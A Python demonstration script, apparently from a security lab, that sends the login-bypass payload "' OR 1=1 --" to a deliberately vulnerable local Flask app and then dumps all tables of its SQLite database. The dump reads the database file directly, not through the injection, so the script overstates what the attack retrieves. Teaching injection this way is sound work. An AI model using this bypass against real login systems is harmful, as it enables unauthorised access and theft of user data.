"""
This script demonstrates an SQL injection attack on a vulnerable Flask web application to bypass login and gain admin access.

Usage:
```sh
python sql_injection.py --db ../unsafe_version/db.sqlite
"""

import requests
import sqlite3
import argparse

BASE_URL = "http://127.0.0.1:5000"

def sql_injection(db_path):
    """
    Attempt SQL Injection to login as Admin and retrieve database tables.

    Args:
        db_path (str): Path to the SQLite database file.
    """
    url = f"{BASE_URL}/login"
    
    # Let Flask parse URL encoded data
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    payload = "username=' OR 1=1 -- &password=password"

    session = requests.Session()
    response = session.post(url, data=payload, headers=headers, allow_redirects=False)

    if response.status_code == 302:
        print("[+] SQL Injection Successful - Logged in as Admin!")
        
        # Access the homepage to confirm if logged in as Admin
        home_response = session.get(f"{BASE_URL}/")
        if "Logged in as: <strong>admin</strong>" in home_response.text:
            print("[+] Confirmed: Logged in as Admin")
        else:
            print("[!] Warning: Login was successful, but Admin status not confirmed.")
        
        # Retrieve database tables
        print("\n[+] Retrieving database contents...\n")
        retrieve_database(db_path)
        
        return True
    else:
        print("[-] SQL Injection Failed.")
        return False

def retrieve_database(db_path):
    """
    Retrieve and print all database tables.

    Args:
        db_path (str): Path to the SQLite database file.
    """
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Get all table names
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
        tables = cursor.fetchall()

        if not tables:
            print("[-] No tables found in database.")
            return

        for table in tables:
            table_name = table[0]
            print(f"\n[+] Table: {table_name}")
            
            cursor.execute(f"PRAGMA table_info({table_name});")
            columns = cursor.fetchall()
            column_names = [col[1] for col in columns]

            # Get table data
            cursor.execute(f"SELECT * FROM {table_name};")
            rows = cursor.fetchall()

            if rows:
                print(f"{' | '.join(column_names)}")
                print("-" * 40)
                for row in rows:
                    print(" | ".join(str(value) for value in row))
            else:
                print("[!] Table is empty.")

        conn.close()
    
    except sqlite3.OperationalError as e:
        print(f"[ERROR] Failed to read database: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Tester")
    parser.add_argument("--db", type=str, required=True, help="Path to SQLite database (db.sqlite)")
    args = parser.parse_args()

    sql_injection(args.db)
